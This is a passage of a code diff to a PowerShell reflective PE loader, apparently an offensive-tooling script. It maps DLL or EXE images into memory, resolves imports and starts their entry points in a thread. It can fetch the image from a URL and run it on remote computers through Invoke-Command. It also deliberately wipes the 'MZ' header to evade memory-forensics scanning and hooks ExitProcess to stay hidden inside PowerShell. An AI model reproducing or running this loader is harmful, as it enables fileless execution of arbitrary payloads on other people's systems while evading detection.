 		{ 
 			Throw "VirtualAlloc failed to allocate memory."
 		}
 		
-		[System.Runtime.InteropServices.Marshal]::Copy($DllBytes, 0, $DllHandle, $DllInfo.SizeOfHeaders) | Out-Null
+		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
 		
 		
-		#Now that the DLL is in memory, get more detailed information about it
-		Write-Debug "Getting detailed Dll information from the headers loaded in memory"
-		$DllInfo = Get-DllDetailedInfo -DllHandle $DllHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
-		$DllInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $DllEndAddress
+		#Now that the PE is in memory, get more detailed information about it
+		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
+		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
+		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
 		
 		
-		#Copy each section from the DLL in to memory
-		Write-Debug "Copy DLL sections in to memory"
-		Copy-Sections -DllBytes $DllBytes -DllInfo $DllInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
+		#Copy each section from the PE in to memory
+		Write-Verbose "Copy PE sections in to memory"
+		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
 		
 		
-		#Update the memory addresses hardcoded in to the Dll based on the memory address the Dll was expecting to be loaded to vs where it was actually loaded
-		Write-Debug "Update memory addresses based on where the Dll was actually loaded in memory"
-		Update-MemoryAddresses -DllInfo $DllInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types
+		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
+		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
+		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types
 		
 		
-		#The DLL we are in-memory loading has DLLs it needs, import those DLLs for it
-		Write-Debug "Import DLL's needed by the DLL we are loading"
-		[IntPtr]$ExeDoneBytePtr = [IntPtr]::Zero
-		if ($DllInfo.FileType -ieq "EXE")
-		{
-			$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
-			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
-		}
-		Import-DllImports -DllInfo $DllInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr
+		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
+		Write-Verbose "Import DLL's needed by the PE we are loading"
+		Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
 		
 		
 		#Update the memory protection flags for all the memory just allocated
-		#Write-Debug "Update memory protection flags"
-		#Update-MemoryProtectionFlags -DllInfo $DllInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
-		#TODO: re-enable this
+		Write-Verbose "Update memory protection flags"
+		Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
+		
 		
 		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
-		if ($DllInfo.FileType -ieq "DLL")
+		if ($PEInfo.FileType -ieq "DLL")
 		{
-			Write-Debug "Calling dllmain so the DLL knows it has been loaded"
-			$DllMainPtr = Add-SignedIntAsUnsigned ($DllInfo.DllHandle) ($DllInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+			Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
+			$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
 			$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
 			$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
 			
-			$DllMain.Invoke($DllInfo.DllHandle, 1, [IntPtr]::Zero) | Out-Null
+			$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
 		}
-		elseif ($DllInfo.FileType -ieq "EXE")
+		elseif ($PEInfo.FileType -ieq "EXE")
 		{
+			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
+			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
+			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
+			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr
+
 			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
 			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
-			Write-Debug "Call EXE Main function"
+			Write-Verbose "Call EXE Main function"
 			
-			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($DllInfo.DllHandle) ($DllInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
 			$Success = Invoke-Win32 "kernel32.dll" ([IntPtr]) "CreateThread" @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [Ref]) @([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([IntPtr]::Zero))
-			Write-Debug "Created thread for process"
+			Write-Verbose "Created thread for process"
 			
 			while($true)
 			{
 				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
 				if ($ThreadDone -eq 1)
 				{
-					Write-Debug "Thread has finished!"
+					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
+					Write-Verbose "Thread has finished!"
 					break
 				}
 				else
 				{
-					Write-Debug "Sleeping for 1 second to wait for thread completion. ThreadDone val = $ThreadDone"
 					Start-Sleep -Seconds 1
 				}
 			}
-			
-#			$ExeMainPtr = Add-SignedIntAsUnsigned ($DllInfo.DllHandle) ($DllInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
-#			$ExeMainDelegate = Get-DelegateType @() ([Int32])
-#			$ExeMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ExeMainPtr, $ExeMainDelegate)
-#			Read-Host "Breaking right before execution" | Out-Null
-#			$ExeMain.Invoke() | Out-Null
-#			Write-Debug "Done executing EXE"
 		}
 		
-		return ($DllInfo.DllHandle)
+		return ($PEInfo.PEHandle)
 	}
 
 
 	Function Main
 	{
-		$DebugPreference = "Continue"
-		
-		#Load the DLL reflectively
-		Write-Debug "Calling Invoke-MemoryLoadLibrary"
-		$DllHandle = Invoke-MemoryLoadLibrary -DllBytes $DllBytes -ExeArgs $ExeArgs
-		if ($DllHandle -eq [IntPtr]::Zero)
+		#Load the PE reflectively
+		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
+		$PEHandle = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
+		if ($PEHandle -eq [IntPtr]::Zero)
 		{
-			Throw "Unable to load DLL, handle returned is NULL"
+			Throw "Unable to load PE, handle returned is NULL"
 		}
 		
+		
+		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
+		$Win32Types = Get-Win32Types
+		$Win32Constants =  Get-Win32Constants
+		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
+		if ($PEInfo.FileType -ieq "EXE")
+		{
+			return
+		}
 		
 		
 		#########################################
 		### YOUR CODE GOES HERE
 		#########################################
-		if ($FuncReturnType -ieq "WString")
-		{
-			Write-Debug "Calling function with WString return type"
-			[IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -DllHandle $DllHandle -FunctionName "WStringFunc"
-			if ($WStringFuncAddr -eq [IntPtr]::Zero)
-			{
-				Throw "Couldn't find function address."
-			}
-			$WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
-			$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
-			[IntPtr]$OutputPtr = $WStringFunc.Invoke()
-			$Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
-			Write-Output $Output
-		}
-		elseif ($FuncReturnType -ieq "String")
-		{
-			Write-Debug "Calling function with String return type"
-			[IntPtr]$StringFuncAddr = Get-MemoryProcAddress -DllHandle $DllHandle -FunctionName "StringFunc"
-			if ($StringFuncAddr -eq [IntPtr]::Zero)
-			{
-				Throw "Couldn't find function address."
-			}
-			$StringFuncDelegate = Get-DelegateType @() ([IntPtr])
-			$StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
-			[IntPtr]$OutputPtr = $StringFunc.Invoke()
-			$Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
-			Write-Output $Output			
-		}
-		elseif (($FuncReturnType -ieq $null) -or ($FuncReturnType -ieq '') -or ($FuncReturnType -ieq "Void"))
-		{
-			Write-Debug "Calling function with Void return type"
-			[IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -DllHandle $DllHandle -FunctionName "VoidFunc"
-			if ($VoidFuncAddr -eq [IntPtr]::Zero)
-			{
-				Throw "Couldn't find function address."
-			}
-			$VoidFuncDelegate = Get-DelegateType @() ([Void])
-			$VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
-			$VoidFunc.Invoke() | Out-Null
-		}
-		else
-		{
-			Throw "Unknown FuncReturnType found"
-		}
+        switch ($FuncReturnType)
+        {
+            'WString' {
+                Write-Verbose "Calling function with WString return type"
+			    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
+			    if ($WStringFuncAddr -eq [IntPtr]::Zero)
+			    {
+				    Throw "Couldn't find function address."
+			    }
+			    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
+			    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
+			    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
+			    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
+			    Write-Output $Output
+            }
 
-		
+            'String' {
+                Write-Verbose "Calling function with String return type"
+			    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
+			    if ($StringFuncAddr -eq [IntPtr]::Zero)
+			    {
+				    Throw "Couldn't find function address."
+			    }
+			    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
+			    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
+			    [IntPtr]$OutputPtr = $StringFunc.Invoke()
+			    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
+			    Write-Output $Output
+            }
+
+            'Void' {
+                Write-Verbose "Calling function with Void return type"
+			    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
+			    if ($VoidFuncAddr -eq [IntPtr]::Zero)
+			    {
+				    Throw "Couldn't find function address."
+			    }
+			    $VoidFuncDelegate = Get-DelegateType @() ([Void])
+			    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
+			    $VoidFunc.Invoke() | Out-Null
+            }
+        }
 		#########################################
 		### END OF YOUR CODE
 		#########################################
 		
 		
-		
-		Write-Debug "Done!"
+		Write-Verbose "Done!"
 	}
 
 	Main
@@ -1767,30 +1843,43 @@ $RemoteScriptBlock = {
 #Main function to either run the script locally or remotely
 Function Main
 {
-	Write-Output "Current PID: $pid"
-	Read-Host "Press key to continue" | Out-Null #todo delete me
-	
-	[System.IO.Directory]::SetCurrentDirectory($PWD)
-	
-	[Byte[]]$DllBytes = $null
+	[Byte[]]$PEBytes = $null
 	
 	if ($PsCmdlet.ParameterSetName -ieq "LocalFile")
 	{
-		[Byte[]]$DllBytes = [System.IO.File]::ReadAllBytes($DllPath)
+		Get-ChildItem $PEPath -ErrorAction Stop | Out-Null
+		[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
 	}
 	else
 	{
 		$WebClient = New-Object System.Net.WebClient
-		[Byte[]]$DllBytes = $WebClient.DownloadData($DllUrl)
+		
+		[Byte[]]$PEBytes = $WebClient.DownloadData($PEUrl)
 	}
+	
+	#Verify the image is a valid PE file
+	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''
+
+    if ($e_magic -ne 'MZ')
+    {
+        throw 'PE is not a valid PE file.'
+    }
+
+    # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
+	# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
+    $PEBytes[0] = 0
+    $PEBytes[1] = 0
+	
+	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
+	$ExeArgs = "ReflectiveExe $ExeArgs"
 
 	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
 	{
-		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($DllBytes, $FuncReturnType)
+		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType)
 	}
 	else
 	{
-		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($DllBytes, $FuncReturnType) -ComputerName $ComputerName
+		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType) -ComputerName $ComputerName
 	}
 }
 
